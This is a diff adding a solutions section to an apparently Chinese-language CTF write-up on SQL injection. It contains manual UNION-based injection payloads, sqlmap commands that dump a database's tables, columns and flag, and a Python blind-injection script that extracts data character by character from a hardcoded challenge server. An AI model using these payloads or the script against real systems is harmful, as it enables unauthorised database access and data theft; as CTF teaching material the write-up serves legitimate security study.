@@ -44,6 +44,84 @@
 ?id=1 union select 1,group_concat(content),3 from sae_user_sqli3
 ```
 
+### 解法
+
+* 手工注入
+``` 
+1. 检测sql注入 - 判断过滤条件
+?id=1'--+
+?id=1' #
+?id=1’-- +
+
+2. 
+# 4访问成功，5访问失败，参数就可以确定在1到4之间
+?id=1' order by 4#              
+?id=1' order by 5#
+
+3. 
+id=-1' union select 1,2,3,4#
+id=-1' union select 1,2,3,database()#
+。。。
+
+```
+
+* sqlmap
+1. 抓包
+2. 右键，点击copy to file保存文件
+3. sqlmap开始爆库
+``` 
+sqlmap.py -r “C:\333.txt” -p id –current-db 
+-r –> 加载一个文件 
+-p –>指定参数 
+–current-db –>获取当前数据库名称（current前有两个-）
+
+sqlmap.py -r “C:\333.txt” -p id -D skctf_flag - -tables 
+-D –>指定数据库名称 
+–tables –>列出数据库中的表(tables前有两个-) 
+
+sqlmap.py -r “C:\333.txt” -p id -D skctf_flag -T fl4g –columns 
+-T –>指定表名称 
+–columns –>列出表中的字段 
+
+sqlmap.py -r “c:\333.txt” -p id -D skctf_flag -T fl4g -C skctf_flag –dump 
+–dump –>列出字段数据(dump前有两个-)  
+
+```
+
+* python sql盲注
+``` 
+# -*- coding:utf-8 -*-
+import requests
+import re
+ 
+url = "http://120.24.86.145:8002/chengjidan/index.php"
+ 
+base_payload = "1' and if(ascii(substr({data},{len},1))>{number},1,0)#" #if(prep1.prep2,prep3) 若表达式prep1为真，则返回prep2，若prep1为假，则返回prep3
+#base_payload = "1' and if(ascii(substr(select table_name from information_schema.tables where table_name=database() limit 0,1)>{num},{len},1),1,0)#"
+#payload = "database()" #skctf_flag 
+#payload = "(select table_name from information_schema.tables where table_schema=database() limit 0,1)" #fl4g
+#payload = "(select column_name from information_schema.columns where table_name='fl4g' limit 0,1)" #skctf_flag
+payload = "(select skctf_flag from fl4g limit 0,1)"
+ 
+information=""
+ 
+for m in range(1,50):
+    for i in range(32,129):
+        post_data = {"id":base_payload.format(data = payload,len = m,number=i)}
+        r = requests.post(url,post_data)
+        resultarr = re.findall(r"<td>(.+?)<td>",r.text)
+        result = ''.join(resultarr)
+        #print result 
+        #print r.text
+        #print post_data
+        if '60' not in result:
+            information += chr(i)
+            break
+    print information
+
+```
+
+
 
 ## 约束注入
 ``` 
